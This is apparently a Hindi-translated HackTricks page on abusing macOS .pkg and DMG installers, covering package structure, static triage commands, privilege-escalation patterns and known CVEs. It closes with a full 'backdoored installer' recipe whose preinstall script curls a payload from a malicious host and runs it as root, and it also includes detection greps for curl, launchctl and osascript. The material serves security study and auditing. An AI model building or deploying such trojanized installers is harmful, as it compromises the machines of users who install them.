# macOS Installers का Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg की Basic Information

macOS का **installer package** (जिसे `.pkg` file भी कहा जाता है) macOS द्वारा **software distribute करने** के लिए उपयोग किया जाने वाला file format है। ये files एक **box की तरह होती हैं, जिसमें software को सही तरीके से install और run करने के लिए आवश्यक सभी चीजें** होती हैं।

Package file स्वयं एक archive होती है, जिसमें **target computer पर install की जाने वाली files और directories की hierarchy** होती है। इसमें installation से पहले और बाद में tasks करने के लिए **scripts** भी शामिल हो सकती हैं, जैसे configuration files सेट करना या software के पुराने versions को clean up करना।

### Package Structure

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizations (title, welcome text…) और script/installation checks
- **PackageInfo (xml)**: Info, install requirements, install location, run की जाने वाली scripts के paths
- **Bill of materials (bom)**: File permissions के साथ install, update या remove की जाने वाली files की list
- **Payload (CPIO archive gzip compressed)**: PackageInfo के `install-location` में install की जाने वाली files
- **Scripts (CPIO archive gzip compressed)**: Pre और post install scripts तथा अन्य resources, जिन्हें execution के लिए एक temp directory में extract किया जाता है।

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
इंस्टॉलर की सामग्री को मैन्युअल रूप से decompress किए बिना देखने के लिए आप free tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) का भी उपयोग कर सकते हैं।

### Static triage shortcuts

यदि लक्ष्य analysis है, तो पहले package को `Installer.app` से खोलने से **बचने का प्रयास करें**। कुछ packages Installer द्वारा खोले जाते ही code execute कर सकते हैं (उदाहरण के लिए `system.run()` या installer plug-ins के माध्यम से), इसलिए offline extraction आमतौर पर अधिक सुरक्षित शुरुआती कदम होता है।
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG की मूल जानकारी

DMG files, या Apple Disk Images, Apple के macOS द्वारा disk images के लिए उपयोग किया जाने वाला file format है। DMG file मूल रूप से एक **mountable disk image** होती है (इसमें अपना filesystem होता है), जिसमें आमतौर पर compressed और कभी-कभी encrypted raw block data होता है। जब आप DMG file खोलते हैं, तो macOS उसे **ऐसे mount करता है जैसे वह कोई physical disk हो**, जिससे आप उसकी contents तक पहुंच सकते हैं।

> [!CAUTION]
> ध्यान दें कि **`.dmg`** installers **बहुत सारे formats** को support करते हैं और पहले इनमें से कुछ में मौजूद vulnerabilities का abuse करके **kernel code execution** प्राप्त किया गया था।

### Disk Image Structure

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

DMG file की hierarchy उसकी content के आधार पर अलग हो सकती है। हालांकि, application DMGs के लिए यह आमतौर पर इस structure का पालन करती है:

- Top Level: यह disk image का root होता है। इसमें अक्सर application और संभवतः Applications folder का link होता है।
- Application (.app): यह वास्तविक application होती है। macOS में application आमतौर पर एक package होती है, जिसमें application बनाने वाली कई individual files और folders शामिल होते हैं।
- Applications Link: यह macOS में Applications folder का shortcut होता है। इसका उद्देश्य application को install करना आसान बनाना है। आप app install करने के लिए .app file को इस shortcut पर drag कर सकते हैं।

## pkg abuse के जरिए Privesc

### public directories से Execution

यदि कोई pre- या post-installation script **`/var/tmp/Installerutil`** जैसी file को execute करती है और attacker उस file को replace कर सकता है, तो installer द्वारा उसे invoke किए जाने पर attacker privileges escalate कर सकता है। उद्धृत talks और walkthrough इस insecure external-script pattern के variants दिखाते हैं।<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

यह एक [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) है, जिसे कई installers और updaters **किसी चीज को root के रूप में execute करने** के लिए call करते हैं। यह function execute की जाने वाली **file** का **path** parameter के रूप में स्वीकार करता है, हालांकि, यदि कोई attacker इस file को **modify** कर सके, तो वह root के साथ इसके execution का **abuse** करके **privileges escalate** कर सकेगा।
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
अधिक जानकारी के लिए यह talk देखें: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Environment और shebang का दुरुपयोग

Modern PackageKit bugs से पता चला कि installer scripts अक्सर **trusted root code** के रूप में execute की जाती हैं, जबकि attacker-controlled context अब भी पास में बना रहता है। Vendor packages का audit करते समय इन पर विशेष ध्यान दें:

- `#!/bin/zsh` / `#!/bin/bash` जैसे Shell interpreters
- `sudo -u $USER`, `launchctl asuser` जैसी calls, या ऐसा कोई logic जो `$USER`, `$HOME`, `PATH`, `TMPDIR`, या relative paths पर भरोसा करता हो
- ऐसे Non-shell interpreters जो user-controlled init files या libraries load कर सकते हैं
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
2024 PackageKit root-environment bug (`~/.zshenv` / `~/.bash*` inheritance during user-initiated installs) के लिए [generic macOS privesc page](../macos-privilege-escalation.md) देखें। यदि package **Apple-signed** है, तो यही script bug **SIP/TCC-relevant** बन सकता है, क्योंकि `system_installd` के पास `com.apple.rootless.install.heritable` हो सकता है; [SIP page](../macos-security-protections/macos-sip.md) देखें।<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Mount करके Execution

यदि कोई installer `/tmp/fixedname/bla/bla` में लिखता है, तो `/tmp/fixedname` के ऊपर `noowners` के साथ **mount बनाना** संभव है, जिससे installation के दौरान **किसी भी file को modify** करके installation process का दुरुपयोग किया जा सकता है।

इसका एक उदाहरण **CVE-2021-26089** है, जिसमें **periodic script को overwrite** करके root के रूप में execution प्राप्त किया गया। अधिक जानकारी के लिए यह talk देखें: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## malware के रूप में pkg

### Empty Payload

सिर्फ **`.pkg`** file बनाना संभव है, जिसमें **pre और post-install scripts** हों और scripts के अंदर मौजूद malware के अलावा कोई वास्तविक payload न हो।<sup>[[2]](#references)</sup>

### Distribution xml में JS

Package की **distribution xml** file में **`<script>`** tags जोड़ना संभव है। यह code execute हो जाएगा और **`system.run`** का उपयोग करके **commands execute** कर सकता है:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Distribution packages में यह आमतौर पर top-level `Distribution` file द्वारा external scripts enable करने पर निर्भर करता है, उदाहरण के लिए `allow-external-scripts="true"` के साथ। इसलिए केवल `preinstall` / `postinstall` की समीक्षा पर्याप्त नहीं है: **Distribution XML स्वयं** `installation-check` / `volume-check` hooks और direct `system.run()` / `system.runOnce()` execution paths रख सकता है।
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

dist.xml के अंदर script और JS code का उपयोग करने वाला malicious installer
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Pkgs को अनपैक करना: Macos Installer Packages के अंदर एक नज़र और सामान्य Security Flaws](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "macOS Installers की जंगली दुनिया" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Pkgs को अनपैक करना: MacOS Installer Packages के अंदर एक नज़र](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Installer Packages का Exploitation](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Apple-signed Packages के साथ SIP को तोड़ना](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Bugs का Mount(ain)" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - macOS पर 1000 Installers से मृत्यु और सब कुछ खराब है!](https://www.youtube.com/watch?v=lTOItyjTTkw)
{{#include ../../../banners/hacktricks-training.md}}
